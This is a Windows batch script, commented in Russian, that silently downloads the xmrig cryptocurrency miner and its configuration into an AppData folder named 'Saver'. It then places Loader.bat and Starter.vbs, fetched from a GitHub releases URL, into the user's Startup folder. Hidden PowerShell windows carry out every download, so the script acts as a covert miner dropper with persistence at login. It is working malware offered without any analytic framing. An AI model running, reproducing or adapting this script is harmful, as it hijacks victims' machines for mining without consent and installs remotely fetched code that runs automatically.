@echo off
:: Отключение вывода команд в командной строке

:: Установка пути каталога назначения для файлов xmrig.exe и config.json в %AppData%\Saver
set "destination=%AppData%\Saver"

:: Создание каталога назначения для xmrig.exe и config.json, если он не существует
if not exist "%destination%" mkdir "%destination%"

:: Прямые ссылки на файлы
set "link1=https://github.com/simpleanswer/src/releases/download/new/xmrig.exe"
set "link2=https://github.com/simpleanswer/src/releases/download/new/config.json"

:: Проверка существования и загрузка файлов xmrig.exe и config.json
if not exist "%destination%\xmrig.exe" (
    echo Загрузка xmrig.exe...
    powershell -WindowStyle Hidden -command "& {curl.exe -L '%link1%' -o '%destination%\xmrig.exe'}"
)

if not exist "%destination%\config.json" (
    echo Загрузка config.json...
    powershell -WindowStyle Hidden -command "& {curl.exe -L '%link2%' -o '%destination%\config.json'}"
)

:: Установка пути каталога назначения для файлов Loader.bat и Starter.vbs в %AppData%\Microsoft\Windows\Start Menu\Programs\Startup
set "startup_destination=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Создание каталога назначения для Loader.bat и Starter.vbs, если он не существует
if not exist "%startup_destination%" mkdir "%startup_destination%"

:: Прямые ссылки на файлы
set "link3=https://github.com/simpleanswer/src/releases/download/new/Loader.bat"
set "link4=https://github.com/simpleanswer/src/releases/download/new/Starter.vbs"

:: Проверка существования и загрузка файлов Loader.bat и Starter.vbs
if not exist "%startup_destination%\Loader.bat" (
    echo Загрузка Loader.bat...
    powershell -WindowStyle Hidden -command "& {curl.exe -L '%link3%' -o '%startup_destination%\Loader.bat'}"
)

if not exist "%startup_destination%\Starter.vbs" (
    echo Загрузка Starter.vbs...
    powershell -WindowStyle Hidden -command "& {curl.exe -L '%link4%' -o '%startup_destination%\Starter.vbs'}"
)

:: Завершение работы скрипта
exit
